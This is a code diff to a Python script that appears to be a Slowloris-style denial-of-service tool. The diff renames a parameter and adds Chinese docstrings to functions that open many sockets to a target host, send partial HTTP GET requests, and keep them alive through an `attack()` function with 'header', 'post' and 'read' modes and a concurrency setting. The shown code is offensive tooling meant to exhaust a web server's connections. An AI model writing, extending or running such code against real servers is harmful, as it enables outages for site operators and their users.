@@ -8,14 +8,22 @@ from my_socket import MySocket
 from user_agents import user_agents
 
 
-def init_socket(ip, port, https, randuseragent):
+def init_socket(host, port, https, randuseragent):
+    """
+    初始化一个用于 HTTP/HTTPS 的 socket
+    :param host: str, 目标主机
+    :param port: int, 目标端口
+    :param https: boolean, 是否使用 https
+    :param randuseragent: boolean, 是否使用随机 User-Agent
+    :return:
+    """
     s = MySocket(socket.AF_INET, socket.SOCK_STREAM)
     s.settimeout(4)
 
     if https:
         s = ssl.wrap_socket(s)
 
-    s.connect((ip, port))
+    s.connect((host, port))
 
     s.send_line(f"GET /?{random.randint(0, 2000)} HTTP/1.1")
 
@@ -29,6 +37,17 @@ def init_socket(ip, port, https, randuseragent):
 
 
 def attack(mode, host, port, sockets, sleeptime, https, randuseragent):
+    """
+    发起攻击
+    :param mode: str, 模式，目前支持 "header", "post", "read"
+    :param host: str, 目标主机
+    :param port: int, 目标端口
+    :param sockets: int, 并发数
+    :param sleeptime: int, 两次发送以维持 socket 不断开的间隔时间
+    :param https: boolean, 是否使用 https
+    :param randuseragent: boolean, 是否使用随机 User-Agent
+    :return:
+    """
     list_of_sockets = []
     ip = host
     socket_count = sockets
